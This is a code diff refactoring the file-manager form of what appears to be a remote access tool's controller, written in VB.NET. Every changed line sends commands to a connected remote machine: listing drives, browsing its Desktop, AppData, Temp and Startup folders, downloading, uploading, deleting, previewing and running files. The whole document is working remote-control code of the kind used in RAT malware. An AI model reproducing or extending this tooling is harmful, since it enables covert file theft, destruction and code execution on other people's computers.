@@ -3,7 +3,7 @@
 Public Class File_Manager
 
     Public M As Main
-    Public C As S_Client
+    Public U
     Private m_SortingColumn As ColumnHeader
 
 
@@ -81,19 +81,19 @@ Public Class File_Manager
 
 
     Private Sub File_Manager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
-        C.BeginSend("Drivers")
+        M.S.Send(U, "Drivers")
         Timer1.Interval = 1000
         Timer1.Start()
     End Sub
 
     Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
-        If Not C.IsConnected Then
+        If Not M.S.Online.Contains(U) Then
             Me.Close()
         End If
     End Sub
 
     Public Sub RefreshList()
-        C.BeginSend("FM" & M.SPL & Label1.Text)
+        M.S.Send(U, "FM" & M.SPL & Label1.Text)
         Label2.Text = ""
         Label2.ForeColor = Color.Red
     End Sub
@@ -117,14 +117,14 @@ Public Class File_Manager
     End Sub
 
     Private Sub File_Manager_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
-        C.BeginSend("Close")
+        M.S.Send(U, "Close")
     End Sub
 
     Private Sub BackToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BackToolStripMenuItem.Click
         Try
             If Label1.Text.Length < 4 Then
                 Label1.Text = ""
-                C.BeginSend("Drivers" & M.SPL)
+                M.S.Send(U, "Drivers" & M.SPL)
             Else
                 Label1.Text = Label1.Text.Substring(0, Label1.Text.LastIndexOf("\"))
                 Label1.Text = Label1.Text.Substring(0, Label1.Text.LastIndexOf("\") + 1)
@@ -143,7 +143,7 @@ Public Class File_Manager
     Private Sub DWToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DWToolStripMenuItem.Click
         Try
             If L1.FocusedItem.Text.Length > 1 Then
-                C.BeginSend("DW" & M.SPL & Label1.Text + L1.FocusedItem.Text)
+                M.S.Send(U, "DW" & M.SPL & Label1.Text + L1.FocusedItem.Text)
                 Label2.Text = "Downloading " + L1.FocusedItem.Text
             End If
         Catch ex As Exception
@@ -151,7 +151,7 @@ Public Class File_Manager
         End Try
     End Sub
 
-    Private Async Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadToolStripMenuItem.Click
+    Private Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadToolStripMenuItem.Click
         Try
             Dim o As New OpenFileDialog
             With o
@@ -159,7 +159,7 @@ Public Class File_Manager
             End With
 
             If o.ShowDialog = Windows.Forms.DialogResult.OK Then
-                C.BeginSend("UP" & M.SPL & Label1.Text + IO.Path.GetFileName(o.FileName) & M.SPL & Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(o.FileName), True)))
+                M.S.Send(U, "UP" & M.SPL & Label1.Text + IO.Path.GetFileName(o.FileName) & M.SPL & Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True)))
                 Label2.Text = "Uploading " + IO.Path.GetFileName(o.FileName)
             End If
         Catch ex As Exception
@@ -169,35 +169,35 @@ Public Class File_Manager
 
     Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
         For Each x As ListViewItem In L1.SelectedItems
-            C.BeginSend("DEL" & M.SPL & Label1.Text + x.Text)
+            M.S.Send(U, "DEL" & M.SPL & Label1.Text + x.Text)
         Next
     End Sub
 
     Private Sub DesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DesktopToolStripMenuItem.Click
-        C.BeginSend("GOTO" & M.SPL & "Desktop")
+        M.S.Send(U, "GOTO" & M.SPL & "Desktop")
     End Sub
 
     Private Sub AppDataToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AppDataToolStripMenuItem.Click
-        C.BeginSend("GOTO" & M.SPL & "AppData")
+        M.S.Send(U, "GOTO" & M.SPL & "AppData")
     End Sub
 
     Private Sub TempToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TempToolStripMenuItem.Click
-        C.BeginSend("GOTO" & M.SPL & "Temp")
+        M.S.Send(U, "GOTO" & M.SPL & "Temp")
     End Sub
 
     Private Sub UserFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UserFolderToolStripMenuItem.Click
-        C.BeginSend("GOTO" & M.SPL & "User")
+        M.S.Send(U, "GOTO" & M.SPL & "User")
     End Sub
 
     Private Sub StartupToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartupToolStripMenuItem.Click
-        C.BeginSend("GOTO" & M.SPL & "Startup")
+        M.S.Send(U, "GOTO" & M.SPL & "Startup")
     End Sub
 
     Private Sub L1_Click(sender As Object, e As EventArgs) Handles L1.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
                 If x.Text.ToLower.EndsWith("png") OrElse x.Text.EndsWith("jpeg") OrElse x.Text.EndsWith("jpg") OrElse x.Text.EndsWith("gif") OrElse x.Text.EndsWith("bmp") Then
-                    C.BeginSend("PRE" & M.SPL & Label1.Text + x.Text)
+                    M.S.Send(U, "PRE" & M.SPL & Label1.Text + x.Text)
                 Else
                     PictureBox1.Visible = False
                     PictureBox1.Image = Nothing
@@ -211,7 +211,7 @@ Public Class File_Manager
     Private Sub RunToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                C.BeginSend("RUN" & M.SPL & Label1.Text + x.Text)
+                M.S.Send(U, "RUN" & M.SPL & Label1.Text + x.Text)
             Next
         Catch ex As Exception
             Label2.Text = ex.Message
